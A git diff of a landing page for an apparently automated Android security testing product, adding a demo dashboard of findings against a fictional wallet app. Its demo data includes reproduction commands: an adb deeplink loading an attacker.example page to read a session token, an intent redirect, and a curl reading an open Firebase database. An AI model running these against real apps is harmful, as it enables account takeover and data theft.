@@ -8,6 +8,117 @@ const services = [
   { number: '03', title: 'Dynamic proof', text: 'Real devices. Real traffic. Real abuse cases. Every dynamic finding is reproduced on a live device and captured as evidence.' },
 ]
 
+// Example findings for the interactive product window. Click a row to swap the
+// report panel. A fictional demo app (com.acme.wallet) — never a real target.
+const findings = [
+  {
+    id: 'VULN-0142', sev: 'crit', sevWord: 'Critical', status: 'CONFIRMED',
+    title: 'Deeplink → WebView bridge leaks session token',
+    meta: 'VULN-0142 · CWE-79 · MASVS-PLATFORM-2',
+    reportTitle: 'Deeplink loads an attacker URL into a token-exposing WebView',
+    cvss: '8.2', cwe: 'CWE-79', reach: 'Browsable deeplink',
+    device: 'Pixel 6a · Android 14', location: 'WebBridgeActivity.java:214',
+    repro: 'am start -a VIEW -d "app://web?url=https://attacker.example"',
+    evidenceCode: 'Authorization: Bearer eyJhbGciOi…', evidenceNote: 'captured in traffic',
+  },
+  {
+    id: 'VULN-0138', sev: 'high', sevWord: 'High', status: 'CONFIRMED',
+    title: 'Exported activity enables intent-redirect ATO',
+    meta: 'VULN-0138 · CWE-926',
+    reportTitle: 'Exported activity forwards an attacker Intent to an internal handler',
+    cvss: '7.4', cwe: 'CWE-926', reach: 'Exported activity',
+    device: 'Pixel 6a · Android 14', location: 'LoginRouterActivity.java:88',
+    repro: 'am start -n com.acme.wallet/.LoginRouterActivity --es next "app://reset"',
+    evidenceCode: '302 → attacker.example/reset', evidenceNote: 'redirect reproduced',
+  },
+  {
+    id: 'VULN-0131', sev: 'high', sevWord: 'High', status: 'PROVEN',
+    title: 'Firebase RTDB world-readable and writable',
+    meta: 'VULN-0131 · CWE-284',
+    reportTitle: 'Realtime Database rules allow unauthenticated read and write',
+    cvss: '7.5', cwe: 'CWE-284', reach: 'Network · no auth',
+    device: 'Remote endpoint', location: 'google-services.json',
+    repro: 'curl -s https://acme-wallet.firebaseio.com/users.json',
+    evidenceCode: '200 OK · 3,142 records', evidenceNote: 'unauthenticated read',
+  },
+  {
+    id: 'VULN-0127', sev: 'med', sevWord: 'Medium', status: 'SUSPECTED',
+    title: 'PendingIntent without FLAG_IMMUTABLE',
+    meta: 'VULN-0127 · CWE-1181',
+    reportTitle: 'Mutable PendingIntent lets a co-located app rewrite the wrapped Intent',
+    cvss: '5.9', cwe: 'CWE-1181', reach: 'Installed app',
+    device: 'Pixel 6a · Android 14', location: 'PushService.java:143',
+    repro: 'PendingIntent.getActivity(ctx, 0, intent, 0)',
+    evidenceCode: 'FLAG_IMMUTABLE absent', evidenceNote: 'static (smali)',
+  },
+  {
+    id: 'VULN-0119', sev: 'low', sevWord: 'Low', status: 'SUSPECTED',
+    title: 'Weak crypto (MD5 / SHA-1 / ECB)',
+    meta: 'VULN-0119 · CWE-327',
+    reportTitle: 'Legacy hashing and ECB mode used for local data at rest',
+    cvss: '3.7', cwe: 'CWE-327', reach: 'Local storage',
+    device: 'Pixel 6a · Android 14', location: 'CryptoUtil.java:52',
+    repro: 'Cipher.getInstance("AES/ECB/PKCS5Padding")',
+    evidenceCode: 'MD5 + ECB in CryptoUtil', evidenceNote: 'static',
+  },
+]
+
+// [ THE PROBLEM ] — the once-a-year audit vs continuous, reproduced testing
+const oldWay = [
+  'Weeks to scope, schedule, and kick off.',
+  'A PDF that is already stale on arrival.',
+  'Six figures for a single engagement.',
+  'One snapshot, then blind until next year.',
+]
+const oxWay = [
+  'Point it at a build and the hunt starts.',
+  'Every finding reproduced on a real device.',
+  'A fraction of the cost, on every release.',
+  'Runs again on each candidate, continuously.',
+]
+
+// [ HOW IT WORKS ] — three steps, low friction
+const steps = [
+  { n: '01', title: 'Point us at your build', text: 'Upload an APK or IPA, or link a store listing. No SDK, no code changes, no agents to install.' },
+  { n: '02', title: 'We test on a real device', text: 'The engine drives a physical phone: static analysis, live traffic, deeplinks, WebViews, and native code, the way an attacker would.' },
+  { n: '03', title: 'You get proof, not a PDF', text: 'Every finding lands with severity, the exact reproduction, the captured screen, and a fix, reviewed by a researcher before it reaches you.' },
+]
+
+// [ PROVEN CHAINS ] — real bug classes the engine reproduces, with a category tag
+const chains = [
+  { tag: 'Deeplink → WebView ATO', outcome: 'Confirmed · CVSS 8.2', text: 'A browsable deeplink forwarded its URL into a WebView with no origin check. The injected page reached a @JavascriptInterface method and read the session token — account takeover from a single tapped link.' },
+  { tag: 'Exported intent redirect', outcome: 'Confirmed', text: 'An exported activity forwarded an attacker-supplied Intent to an internal handler, quietly redirecting the login flow to an attacker-controlled reset page.' },
+  { tag: 'Firebase RTDB open', outcome: 'Proven', text: 'Realtime Database rules allowed unauthenticated reads. One request returned 3,142 user records, no credentials required.' },
+  { tag: 'Native JNI overflow', outcome: 'Crash reproduced', text: 'A fuzzer drove a real exported JNI method to a reproducible heap overflow — an on-device crash, captured with the exact input that triggers it.' },
+]
+
+// [ SAFETY ] — maps to oxdroid's real invariants (confirm-and-hold, evidence gate,
+// hardened/ephemeral engine, full logging). All true of the actual system.
+const safety = [
+  { title: 'Confirm and hold', text: 'The engine proves a vulnerability, then stops. Nothing is escalated or chained further without your explicit go-ahead.' },
+  { title: 'Evidence or it does not ship', text: 'No finding leaves the engine without a reproduction. By invariant, not policy — the pipeline drops anything it cannot prove.' },
+  { title: 'Isolated by design', text: 'Every run is sandboxed and ephemeral: a hardened, least-privilege engine and a throwaway device. Nothing persists, nothing leaks.' },
+  { title: 'Full audit trail', text: 'Every command, request, and screen the engine touches is logged and replayable, so you can see exactly what happened.' },
+]
+
+// Product-window console: Coverage view surfaces + Devices view
+const coverageSurfaces = [
+  { name: 'Deeplinks & App Links', pct: 100 },
+  { name: 'WebViews & JS bridges', pct: 100 },
+  { name: 'Exported components', pct: 90 },
+  { name: 'Firebase / backend', pct: 100 },
+  { name: 'Local storage & Keystore', pct: 80 },
+  { name: 'Network & API', pct: 70 },
+  { name: 'Native libraries (JNI)', pct: 55 },
+  { name: 'Auth & session', pct: 45 },
+]
+// Report activity timeline (per selected finding it stays generic — a real run shape)
+const activity = [
+  { who: 'Engine', what: 'flagged this during scan #1788', when: '24h ago' },
+  { who: 'Engine', what: 'reproduced it on Pixel 6a · Android 14', when: '24h ago' },
+  { who: 'Researcher', what: 'confirmed the reproduction', when: '19h ago' },
+]
+
 // Rate-limit helpers (client-side, localStorage)
 const RATE_LIMIT_KEY = 'oxd_form_submissions'
 const RATE_LIMIT_MAX = 3          // max submissions
@@ -48,6 +159,10 @@ export default function Page() {
   const [waitDone, setWaitDone] = useState(false)
   const [waitError, setWaitError] = useState('')
   const [waitOpenedAt, setWaitOpenedAt] = useState<number>(0)
+  // Interactive product window: sidebar view + which finding's report is shown
+  const [pwView, setPwView] = useState<'overview' | 'findings' | 'coverage' | 'devices'>('findings')
+  const [pwFilter, setPwFilter] = useState<'all' | 'crit' | 'high' | 'med' | 'low'>('all')
+  const [activeFinding, setActiveFinding] = useState(0)
 
   function openModal() {
     setFormOpenedAt(Date.now())
@@ -215,62 +330,63 @@ export default function Page() {
         </div>
         <div className="hero-diagram ascii-mascot" aria-label="Animated ASCII art of the oxdroid mascot" role="img">
           <div className="diagram-label">OX / 2026 // FIELD_NOTE_01</div>
-          <pre className="mascot-art" aria-hidden="true">{`@@@@@%@@@@%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@%@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@@@@@@@@%@@@@@@@@@@@@@@@@@@@%@@%#***#%%@@@@@@@@@@@%@@@@@@@@@@@@@@@
-%@@@@@@@@@@@@@@@@@@@%@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#-      .-%@@@@@@@@@@@@@@@@@@@@@@@@@@
-%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@@@@@@@@@@@@@@@@@@@@%@@%@@@@@#: .:::::.  %@@@@@@@@@%@@@@@@@@@@@@@@%
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%@@@@%- .:::::.  *@@@@@@@@@@@@@@@@@%@@@%@@@
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@@%@@@@@@@@@@@@@@@@@@@%=     .   +%@@@@@@@@@@@@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@%@@@@%@@@%%+-:................................. ..     ..:::...::-=#%%@@@%@@@@@@@@@@
-@@@%@@@@@@@@@@@@@@@@%#=.  ...:::::::::::::::::::..            ..  .:::::::::::::..   :*%@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@%*.  -+#################*=-:.      .......      ..-=+*##########**=. .=%@@%@@@@@%
-@@@@@@@@@@@@@@@@@%-  -################*-.    :=##%%%%%%%%%%%%%%%%#+-.    :+###########*. :#%@@@@@@@
-@@@@@@@@@@@%@@@@%-  *####*****####*+:  .:+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%*-.  .-*########*- .#@@@@@@@
-@@@@@@@@@@@@@@@%+  +#####*****##*:  .=#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%*-  .=*######*: -%@@@@@@
-@@@@@@@@@@%@@@@%- .*##########+.  -#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%*.  -*#####=  %@@@@@@
-@@@@@@@@@@@@@@%%- .*########*:  =%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#:  -*###=  %@@@@@@
-@@@@@@@@@@@@@@@%- .*#######-  -#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%*:  =##=  %@@@@@@
-@@@@@@@@@@@@@@@%- .****##*. .*%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%=  :*=  %@@@@@@
-@@@@@@@@@@%%##*+: .-====-.  =++++++**#%%%%%%%%%%%%%%%%%%%####%%%%%%%%%%%%%%%%%%%%%%%%#. :-  %@@@@@%
-@@@@@@@%%+:                            .=#%%%%%%%%%%#+:  .::=%%%%%%%%%%%%%%%%%%%%%%%%%%:    %@@@@@@
-@@@@@@@+   .::......:::::::::::::::::::   =%%%%%%%+.  =#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#:   %@@@@@%
-@@@@@%=  .::......      :::::::::::::::::  =%%%%%%=-%%#*=--=#%%@@%%%%%%%%%%%%%%%%%%%%%%%*.  %@@@@@@
-@@@@%*  .::............   :::::::::::::::.  *%%%%%%%+.        :*%@%%%%%%%%%%%%%%%%%%%%%%%=  %@@@@@@
-@@@@%-  ::...:....::::::   :::::::::::::::  *%%%%%%-  %%%-...   *%@%%%%%%%%%%%%%%%%%%%%%%*. +@@@@@@
-@@%@@:  ::...:....::::::.  :::::::::.:::::  +%%%%%*. :=*=::...  :%@%%%%%%%%%%%%%%%%%%%%%%%- .%@@%@@
-@@@@%-  ::...:....::::::   ::::::::::::::.  *%%%%%#: .:::::...  -%@%%%%%%%%%%%%%%%%%%%%%%%=  #@@@@@
-@@@@%*  .:....:.....:::.  :::::::::::::::.  *%%%%%%=  .......  .#%%%%%%%%%%%%%%%%%%%%%%%%%+. *@@@@@
-@@@@@@=  .:..........    :::::::::::::::.  +%%%%%%%%%:       .=%@@%%%%%%%%%%%%%%%%%%%%%%%%#. =%@@@@
-@@@@@@@+.  ............:::::::::::::::..  =#*+++*%%%%%%%*++*%%@%%%%%%%%%%%%%%%%%%%%%%%%%%%#. =@@@@@
-@@@@@@@%%*:                             =#%#=---*%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%: -@@@@@
-@@@%@@@@@@%@%#+-.  .  .:::::.   ::--=*%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%: -%@@@@
-@@@@@@@@@@@@@@@%-    :%%%%%%%*: -%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%: -%@@@@
-@@@@@@@@@@%@@%@%-   .%%%%%%%%%- .%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%: :%@@@@
-@@@@@@@@@@@@@@@%-   :%%%%%%%%*-.=%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%: -%@@@@
-@@@@@@@@@@@@@@@%-   .%%%%%%%*+#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%: -%@@@@
-@@@@@@@@@@@@@@@%-   .%%%%%%%%%- .%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%: :%@@@@
-@@@@@@@%@@@@@@@%-    *%%%%%*=*%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#. =@@@@@
-@@@@@@@@@@@@@%@%- .. .*%%%%=+#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%*. +%@@@%
-@@@@@@@@@@@@@@%%- .+: .=%%*=+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%=  #@@@@@
-@@@@@@@@@@@@@@@%- .++=.  :-=*%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%-  %@@@@@
-@@@@@@@@%@@@@@@%- .+++++:   =%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%*. =@@@@@@
-@@@@@@@@@@@@@@@%- .+++++++  -%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%-  %@@@@@@
-@@@@@@@@@@@@@@@%- .+++++++. :%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#=.   ..:-==+++=-::.  =%%%%%%%%%%%*.  %@@@@@@
-@@@@@@@@@@@@@@@%- .+++++++=  =%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%+.  #%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#:    %@%@@@@
-@@@@@@@@@@@@@@@%- .+++++*##- .*%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#:    %@@@@@@
-@@@@@@@@@@@@@@@%=  +++++*##*: .*%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%*. .. .%@@@@@@
-@@@@@@@@@@@@@@@%*. :+++++*##*-  -#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#-  :=. +@@@@@@@
-@@@@@@@@@@@@@@@@%+. -+++++++++=.  -*%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%*-  .==. -%@@@@@@@
-@@@@%@@@@@@@@@@@@%*  .=+++++++++=:  .-*%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#=.  :=+:  -%%@@@@@@@
-@@@@@@@@@@@@@@@@%%@%=   -++++++++++=   ::-+#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%+.   -+=.  .#%@@@@%@@@@
-@@@@@@@@@@@@@@@@@@@@%%*:.   ........  .*+--:::::-==+*+********######%%%%%%%#:  .    .=%@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@@%%#*+========.  *%%%##**++=:          -*####%%%%%%*: .==+*#%%@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@%@@@@@@@@@@@@@@%@@%=  .=#%%%%#=.  =%@@@@@%.  =#%%%%%%#:  -%@@@@@@@@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@%@@@@@@@@@@@@@@@@@@@@%+:.      .:+%@@@@@%@@%#-.        .-#%@@@@@@@@@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@%@@@@@@@@@%@%@@@@@%%%####%%@%@@@@@@@@@@@%%%#****#%%@@@@@@@@@@@@@@@@%@@@@@@@@@@
-@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@@@@@@@@@@%@@%@@%@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@%@@@@@@@@@%@@@@@@@@@@@@@@@@@@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@@@@@@@@@@@@`}</pre>
+          <pre className="mascot-art" aria-hidden="true">{`
+                                                        *%%@@%%*
+                                                      =#@@%%%%@@%*
+                                                      %%@%#####%@%*
+                                                      *%@%%####%@@%
+                                                      *#@@@@@@@@%*
+                                  **#@@@@@@@%%%%%%%@%%%%@@@@%%@@@@@@@@@@%%@@@@@@@@@@@@@@%#*=
+                              -#%@@@@@%@%@%%@%@%@%@%%%@%@%%@@@@@@@@@@@@%%@@@@@@%%@%@%@@%@@@@@%#-
+                            *%@@%+-::::::::::::::::::-*#%%@@@@@@@@@@@@@@@@%#*-:::::::::::::-+%@@%:
+                           *@@%:::.:.:.::::::::::+%@@@@@#+-...       ..::=#@@@@@%*::::::::::::-%@@*
+                          #@@+::.::::::..::::-#%@@@*:.                       .:*%@@@#=::::::::::+@@#
+                         *%@+::.:::::::.:::*@@@#:                                 :*@@@#:::::::::+@@*
+                        :%@%:::::::::::::#@@%-                                       :%@@%=:::::::%@%-
+                        =%@*::::.:.:.::#@@*:                                            *@@%-:::::*@%=
+                        =%@*:::::::.:+@@%:                                               .*@@*::::*@%=
+                        =%@*::::::::#@@=                                                   :%@%-::*@%=
+                        +%@#-:::::-%@%.                                                      *@@+:*@%=
+                     *=**%@%=====+%@%-:::::::.                     ..                         =@@**@%=
+                  *#@@@@@@@@@@@@@@@@@@@@@@@@@@@@*:            :+%@@%%=                         =@@@@%=
+                *%@@%%%#%%%%##################%%@@%:       .*@@%=.                              =@@@%-
+               #%@%##%%%%%%@@@@%#################%@%-     .@%+    ..                             *@@%-
+              #%@%%#%%%%%%%%%%@@@@%###############%@#.        =%@@@@@%*.                         .%@%-
+             -%@@%#%%%%%%%%%###%%@@%##############%@%-      :%%*=*%%%@@%=                         +@%*
+             =#@%%#%%%%%%%%#####%%@%###############@@=     .%@+  .#%%%%@@=                        :@%#
+             +%@%%%%%%#%%%%######%@@#########%####%@@=     -@%#***##%%%@@+                        .*@%-
+             +%@%%#%%%%%%%%%####%@@%##############%@%=     .@@%####%%%%@@=                         =@%*
+              #@@%%%%%%%%%%%%%#%@@@%##############%@#:      =@@%%%%%%%@@*.   ....                  -@%*
+              +%@@%#%%%%%%%%%%@@@%###############%@%=        :*@@@@@@@%=    .......                :@%%
+               +%@@%%%%%%%%%%@%%%##############%%@@=.:::-       :-==:.     .........               :%%*
+                 #%@@@@%%%%%%%%%%%%%%%%%%%%%%%@@@*: -#%%%-              ............               :%%#
+                   =#%%%%@@@%@@@%%%%%@@@@%%%%#+-.                       ...........                :%@#
+                        =%@#%@%:     .*@%-                               ........                  :%%#
+                        =%@@@@:        %@#                                                         :%@%
+                        =%@@@*         %@#                                                         :%@#
+                        +%@@@+       .==:.                       :=+**##%%%%%%%%%%-                :%%#
+                        +%@@@#      .==                      :+%@@@@%%#**+++=====-.                :%%*
+                        =%@@@@:     -=:                    .*@@#-:                                 :@%#
+                        =%@%%@%:   :==                     %@#:                                    -@%#
+                        =%@#=%@%=  :=:                    -@%-                                    .=@%*
+                        =%@#--*@@%+==:                    :@%=                                    :*@%+
+                        +%@#=--=*%@@%:                     +@%=                                 ..:%@%
+                        +%@#------*%@:                      =%@%*.                             . .+@%*
+                        +%@#------=%@=                        -%@@@%*=:          :=#%:       . . .@@%-
+                        +%@#------=#@%                           :=%@@@@@@@@@@@@@@@@*.      . . .*@@%-
+                        =%@#------:+%@=                                  ::::::          . . . .+@@@%-
+                        =%@#=----:::*@@:                                               . . . ..+@@@@%-
+                        :%@%=----::::#@@=.                                          .. . . . .*@@*%@%.
+                         *%@*-----::::*@@*.. .                                 . .... . . ..-%@@=*@%*
+                          #@@*---------=%@@*:. . .                       . . . . .........:#@@*=+@@#
+                           *@@%=---------+%@@%=.. . . . . . . . . . . . . . . . . ......=%@@#==#@@#
+                            *@@@#==--------=#@@@#*-:... . . . . .. . . . . . . ......-%@@%*==#@@%=
+                              +%@@@%#***+****%@#=**###**=-:::.:.....................:%@@*#%@@@%=
+                                 *#%@%@@@@@@@@@@+...:-=+****#%@@@@@@@@%=::::........*@@@%@%#+:
+                                              *@@%:.......:=%@%*=++++%@%=.........-%@%=
+                                               -%%@@#+=+*%@@%%       =*%@@#=-:-=*%@@#=
+                                                  *%%@%%%%%+            *%%%@@@@%%*+
+`}</pre>
           <span className="ascii-callout callout-left">AUDIT / ACTIVE</span>
           <span className="ascii-callout callout-right">ANDROID + IOS</span>
           <div className="ascii-baseline"><span>REAL DEVICES / REAL TRAFFIC</span><span>01 / 04</span></div>
@@ -280,34 +396,175 @@ export default function Page() {
 
       <section className="statement section-pad"><p className="section-kicker">Autonomous by design</p><h2>The depth of a researcher.<br /><span>The speed of a machine.</span></h2><div className="statement-bottom"><p>Manual audits do not scale, so most apps get tested once a quarter, if that. oxdroid runs the full assessment autonomously and a researcher reviews the proof, so you get expert depth on every release.</p><span className="big-index">01.</span></div></section>
 
-      <section className="artifact section-pad dark-section" aria-label="Example finding">
+      <section className="problem section-pad" aria-label="The problem">
+        <div className="section-heading"><p className="section-kicker">[ The problem ]</p><h2>Shipping moves weekly.<br /><span>Testing didn&apos;t keep up.</span></h2><p className="heading-note">Manual mobile audits do not scale, so most apps get tested once a quarter, if that. The gap between releases is where issues ship.</p></div>
+        <div className="contrast">
+          <div className="contrast-col old"><span className="contrast-label">The once-a-year audit</span><ul>{oldWay.map((t, i) => <li key={i}>{t}</li>)}</ul></div>
+          <div className="contrast-col new"><span className="contrast-label">The oxdroid way</span><ul>{oxWay.map((t, i) => <li key={i}>{t}</li>)}</ul></div>
+        </div>
+      </section>
+
+      <section className="howitworks section-pad" aria-label="How it works">
+        <div className="section-heading"><p className="section-kicker">[ How it works ]</p><h2>From a build<br /><span>to a proof.</span></h2><p className="heading-note">No SDK, no scoping calls. Three steps to a reproduced finding.</p></div>
+        <div className="how-grid">{steps.map((s) => <article className="how-step" key={s.n}><span className="how-n">{s.n}</span><h3>{s.title}</h3><p>{s.text}</p></article>)}</div>
+      </section>
+
+      <section className="artifact section-pad dark-section" aria-label="The product">
         <div className="section-heading"><p className="section-kicker lime-text">What lands in your queue</p><h2>Not a report.<br /><span>A reproduction.</span></h2><p className="heading-note">Every finding ships the way the engine proved it: the chain, the exact commands, and the captured screen. This is a real shape from a real run, abridged.</p></div>
-        <div className="product-window" role="img" aria-label="oxdroid console showing a confirmed finding">
+        <div className="product-window" role="group" aria-label="Example oxdroid findings dashboard — select a finding to view its report">
           <div className="pw-bar">
             <span className="pw-dots"><i /><i /><i /></span>
-            <span className="pw-tabs"><b className="pw-tab active">Findings</b><b className="pw-tab">Coverage</b><b className="pw-tab">Evidence</b></span>
-            <span className="pw-meta">dk.royalarena · scan #1788 · <em>live</em></span>
+            <span className="pw-search" aria-hidden="true"><span className="pw-search-i">⌕</span>Search findings, packages, CWE…<span className="pw-kbd">⌘K</span></span>
+            <span className="pw-meta">com.acme.wallet · scan #1788 · <em>live</em></span>
           </div>
-          <div className="pw-body">
-            <div className="finding-card">
-              <div className="fc-head"><span className="fc-id">VULN-0142</span><span className="fc-sev">HIGH</span><span className="fc-status">CONFIRMED</span><span className="fc-chain">DEEPLINK → WEBVIEW → JS BRIDGE</span></div>
-              <h3>Deeplink loads attacker URL into a WebView with a token-exposing bridge</h3>
-              <p>The app&apos;s browsable deeplink forwards its URL parameter into WebView.loadUrl() without an origin allowlist. The injected page reaches addJavascriptInterface methods that return the session token.</p>
-              <div className="fc-evidence"><span className="fc-tag">evidence</span><code>adb shell am start -a android.intent.action.VIEW -d &quot;app://web?url=https://attacker.example&quot;</code><code>HAR entry: Authorization: Bearer eyJhbGciOi… (captured)</code><code>frame: poc/screenshots/VULN-0142/after.png</code></div>
-              <div className="fc-foot"><span>reproduced on device · 1 command</span><span>CVSS 8.2 · AV:N/AC:L</span></div>
+          <div className="pw-app">
+            <aside className="pw-side">
+              <div className="pw-ws"><span className="pw-ws-mark">◆</span><b>acme wallet</b><span className="pw-ws-ch">⌄</span></div>
+              <nav className="pw-nav">
+                {([['overview', 'Overview', ''], ['findings', 'Findings', '32'], ['coverage', 'Coverage', ''], ['devices', 'Devices', '1']] as const).map(([v, label, ct]) => (
+                  <button key={v} type="button" className={'pw-nav-i' + (pwView === v ? ' active' : '')} onClick={() => setPwView(v)} aria-pressed={pwView === v}>
+                    <span className="pw-nav-ico" aria-hidden="true" />{label}{ct ? <span className="pw-nav-ct">{ct}</span> : null}
+                  </button>
+                ))}
+              </nav>
+              <div className="pw-side-foot"><span className="pw-live" aria-hidden="true" />agent · online</div>
+            </aside>
+            <div className="pw-main">
+              {pwView === 'findings' && (() => {
+                const f = findings[activeFinding]
+                const shown = findings.filter((x) => pwFilter === 'all' || x.sev === pwFilter)
+                return (
+                  <>
+                    <div className="pw-crumb">Findings<span>›</span>com.acme.wallet<span>›</span><b>{f.id}</b></div>
+                    <div className="pw-stats">
+                      <div className="pw-stat sev-crit"><b>3</b><span>Critical</span></div>
+                      <div className="pw-stat sev-high"><b>7</b><span>High</span></div>
+                      <div className="pw-stat sev-med"><b>6</b><span>Medium</span></div>
+                      <div className="pw-stat sev-low"><b>11</b><span>Low</span></div>
+                      <div className="pw-stat sev-info"><b>5</b><span>Info</span></div>
+                    </div>
+                    <div className="pw-chips">
+                      {([['all', 'All'], ['crit', 'Critical'], ['high', 'High'], ['med', 'Medium'], ['low', 'Low']] as const).map(([k, label]) => (
+                        <button key={k} type="button" className={'pw-chip' + (pwFilter === k ? ' active' : '')} onClick={() => setPwFilter(k)} aria-pressed={pwFilter === k}>{label}</button>
+                      ))}
+                    </div>
+                    <div className="pw-split">
+                      <div className="pw-list">
+                        {shown.map((x) => {
+                          const idx = findings.indexOf(x)
+                          return (
+                            <button key={x.id} type="button" className={'pw-row' + (idx === activeFinding ? ' active' : '')} onClick={() => setActiveFinding(idx)} aria-pressed={idx === activeFinding}>
+                              <span className={'pw-dot ' + x.sev} />
+                              <span className="pw-row-main"><b>{x.title}</b><span className="pw-row-meta">{x.meta}</span></span>
+                              <span className={'pw-rtag ' + (x.status === 'SUSPECTED' ? 'suspected' : 'confirmed')}>{x.status}</span>
+                            </button>
+                          )
+                        })}
+                        <div className="pw-list-foot">Showing {shown.length} of 32<span>View all →</span></div>
+                      </div>
+                      <div className="pw-report">
+                        <div className="pw-report-head"><span className={'pw-rep-sev ' + f.sev}>{f.sevWord.toUpperCase()}</span><span className="pw-rep-id">{f.id}</span></div>
+                        <h4>{f.reportTitle}</h4>
+                        <dl className="pw-props">
+                          <div><dt>Status</dt><dd><span className="pw-open" />Open</dd></div>
+                          <div><dt>Severity</dt><dd><span className={'pw-bars ' + f.sev} aria-hidden="true"><i /><i /><i /></span><span className={'pw-sev-w ' + f.sev}>{f.sevWord}</span> · CVSS {f.cvss}</dd></div>
+                          <div><dt>CWE</dt><dd>{f.cwe}</dd></div>
+                          <div><dt>Reachability</dt><dd>{f.reach}</dd></div>
+                          <div><dt>Device</dt><dd>{f.device}</dd></div>
+                          <div><dt>Location</dt><dd>{f.location}</dd></div>
+                        </dl>
+                        <div className="pw-repro"><span>Reproduction</span><code>{f.repro}</code></div>
+                        <div className="pw-evi"><span className="pw-evi-ok">✓</span> <code>{f.evidenceCode}</code> {f.evidenceNote}</div>
+                        <div className="pw-activity">
+                          {activity.map((a, i) => (
+                            <div className="pw-act" key={i}><span className="pw-act-dot" /><span className="pw-act-t"><b>{a.who}</b> {a.what}</span><span className="pw-act-w">{a.when}</span></div>
+                          ))}
+                        </div>
+                        <div className="pw-actions"><span className="pw-btn">Open fix PR</span><span className="pw-btn ghost">Copy reproduction</span></div>
+                      </div>
+                    </div>
+                  </>
+                )
+              })()}
+
+              {pwView === 'overview' && (
+                <>
+                  <div className="pw-crumb">Overview<span>›</span>com.acme.wallet</div>
+                  <div className="pw-stats">
+                    <div className="pw-stat sev-crit"><b>3</b><span>Critical</span></div>
+                    <div className="pw-stat sev-high"><b>7</b><span>High</span></div>
+                    <div className="pw-stat sev-med"><b>6</b><span>Medium</span></div>
+                    <div className="pw-stat sev-low"><b>11</b><span>Low</span></div>
+                    <div className="pw-stat sev-info"><b>5</b><span>Info</span></div>
+                  </div>
+                  <div className="pw-spark">
+                    <span className="pw-spark-l">Findings analytics<em>14d</em></span>
+                    <svg className="pw-spark-svg" viewBox="0 0 320 44" preserveAspectRatio="none" aria-hidden="true">
+                      <path className="pw-spark-area" d="M0,40 L32,39 L64,40 L96,35 L128,36 L160,30 L192,31 L224,22 L256,24 L288,12 L320,7 L320,44 L0,44 Z" />
+                      <path className="pw-spark-line" d="M0,40 L32,39 L64,40 L96,35 L128,36 L160,30 L192,31 L224,22 L256,24 L288,12 L320,7" />
